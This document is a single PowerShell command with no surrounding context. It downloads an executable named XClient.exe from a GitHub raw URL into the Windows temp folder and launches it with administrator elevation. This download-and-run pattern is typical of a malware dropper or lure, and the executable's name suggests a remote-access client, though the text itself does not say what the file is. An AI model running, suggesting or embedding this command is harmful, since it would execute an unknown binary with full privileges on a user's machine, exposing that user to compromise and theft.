powershell -Command "Invoke-WebRequest -Uri 'https://github.com/DataMasr/te/raw/refs/heads/main/XClient.exe' -OutFile '$env:TEMP\XClient.exe'; Start-Process '$env:TEMP\XClient.exe' -Verb RunAs"
